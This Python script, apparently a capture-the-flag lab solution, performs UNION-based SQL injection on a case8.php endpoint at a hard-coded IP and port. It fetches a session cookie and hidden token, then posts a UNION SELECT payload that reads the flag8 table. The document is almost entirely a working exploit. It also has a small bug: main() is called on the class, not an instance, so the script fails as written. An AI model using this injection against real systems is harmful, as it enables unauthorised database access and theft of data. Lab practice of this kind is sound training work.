import requests
from bs4 import BeautifulSoup

comments = """
    A script to perform UNION-based SQL Injection on the case8.php endpoint,
    retrieving the flag by crafting a payload and handling required session tokens.
"""

tags = """
    #sql_injection #union_select #web_exploitation #python #requests #beautifulsoup
"""

class Py_testing:
    def main(self):
        print('/*== Project to test ==*/')
 
        url = 'http://94.237.120.112:41779/case8.php'

        # Initial GET request to retrieve session cookie and input token
        response = requests.get(url=url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name':'t0ken'}).get('value')
        session = response.cookies.get_dict()

        payload = '1 UNION SELECT 1,2,3,content,5,6 FROM flag8 -- -'
        data = {
            'id': payload,
            't0ken': token
        }

        # POST request with payload and session cookie to exploit the vulnerability
        response = requests.post(url=url, data=data, cookies=session)

        print(response.text)

if __name__ == '__main__':
    Py_testing.main()
